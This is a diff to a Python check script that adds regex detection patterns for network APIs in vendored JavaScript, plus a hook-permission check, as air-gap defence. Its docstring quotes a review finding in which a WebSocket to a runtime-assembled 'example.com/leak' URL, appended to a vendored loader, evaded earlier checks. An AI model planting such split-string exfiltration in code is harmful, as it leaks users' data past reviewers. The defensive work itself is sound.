@@ -373,6 +373,18 @@ NETWORK_APIS = (
     (r"\blocation\s*\.\s*(?:assign|replace)\s*\(", "location.assign/replace"),
 )
 
+# Vendored code is judged against a reviewed count (vendor/NETWORK_APIS), so it
+# also needs the routes app code is held to structurally: fetch() and an image
+# or script whose .src is set. A loader path is safe only through sameOrigin().
+VENDOR_NETWORK_APIS = NETWORK_APIS + (
+    (r"\bfetch\s*\(", "fetch"),
+    (r"\bimport\s*\(", "import()"),
+    (r"\.src\s*=(?!=)", "img.src"),
+    (r"\bnew\s+Image\b", "Image"),
+    (r"""createElement(?:NS)?\s*\([^)]*['"](?:script|iframe|link|embed|object)['"]""",
+     "createElement(script/iframe/link)"),
+)
+
 failures: list[str] = []
 passes: list[str] = []
 
@@ -530,6 +542,79 @@ def _vendor_urls_reviewed():
                 f"vendor/{name} contains a remote URL not in vendor/URLS: {url!r}. "
                 f"Read the code around it: if it is a doc link or an XML namespace, add "
                 f"it to vendor/URLS; if code can fetch it, the upgrade breaks the air-gap")
+    return problems
+
+
+@check("PRODUCT  every network API in vendor/ has been reviewed (vendor/NETWORK_APIS)")
+def _vendor_network_apis_reviewed():
+    """The vendor half of NETWORK_APIS, which only ever scanned app code.
+
+    Codex review round 10 on PR #1: `new WebSocket('ws' + 's://example.com/leak')`
+    appended to STLLoader.js, SHA256SUMS refreshed, passed all 20 checks. The
+    URL is assembled at runtime, so vendor/URLS cannot see it; the API can be
+    seen, and app code was already held to exactly that. The same derivation
+    gap as rounds 5 and 8: a rule applied to one side of the build and not the
+    other.
+
+    Every vendored file's use of each API is counted and compared with the
+    reviewed list. A count that differs -- up or down -- fails by name, so the
+    list stays true and an upgrade shows up as a line a reviewer can judge.
+    """
+    baseline = VENDOR / "NETWORK_APIS"
+    if not baseline.is_file():
+        return ["vendor/NETWORK_APIS is missing -- every network API in vendor/ must be reviewed"]
+    reviewed = {}
+    for ln in baseline.read_text(encoding="utf-8").splitlines():
+        body = ln.split("#", 1)[0].split()
+        if body:
+            count, name, api = body[0], body[1], " ".join(body[2:])
+            reviewed[(name, api)] = int(count)
+    found = {}
+    for name in vendor_sources():
+        f = VENDOR / name
+        if not f.is_file():
+            continue
+        text = f.read_text(encoding="utf-8", errors="replace")
+        for pattern, api in VENDOR_NETWORK_APIS:
+            n = len(re.findall(pattern, text))
+            if n:
+                found[(name, api)] = n
+    problems = []
+    for key in sorted(set(found) | set(reviewed)):
+        have, want = found.get(key, 0), reviewed.get(key, 0)
+        if have != want:
+            problems.append(
+                f"vendor/{key[0]} uses {key[1]} {have} time(s); vendor/NETWORK_APIS "
+                f"reviewed {want}. Read each site: safe only if its URL goes through "
+                f"manager.resolveURL() (sameOrigin) or never leaves the page")
+    return problems
+
+
+@check("STRUCTURE  the hook lets every vendor/ metadata file be edited")
+def _hook_allows_vendor_metadata():
+    """Derived from disk: a file in vendor/ that is not a vendored library is
+    metadata an upgrade must edit, and the PreToolUse hook must not deny it.
+
+    Twice now a new metadata file would have been blocked: round 6 added
+    vendor/URLS and the hook allowed only SHA256SUMS; round 10 added
+    vendor/NETWORK_APIS. A hook that blocks the documented upgrade makes it
+    impossible to follow from Claude Code, so this check asks the hook itself.
+    """
+    import importlib.util
+    spec = importlib.util.spec_from_file_location(
+        "no_direct_viewer_edit", ROOT / ".claude" / "hooks" / "no_direct_viewer_edit.py")
+    hook = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(hook)
+    libraries = set(vendor_sources())
+    problems = []
+    for f in sorted(VENDOR.iterdir()):
+        if f.is_file() and f.name not in libraries:
+            if hook.decide(f"vendor/{f.name}") is not None:
+                problems.append(f"the hook denies vendor/{f.name}, which a vendor upgrade must "
+                                f"edit -- add it to VENDOR_METADATA in the hook")
+    for name in sorted(libraries):
+        if hook.decide(f"vendor/{name}") is None:
+            problems.append(f"the hook allows vendor/{name}, a vendored library")
     return problems
 
 
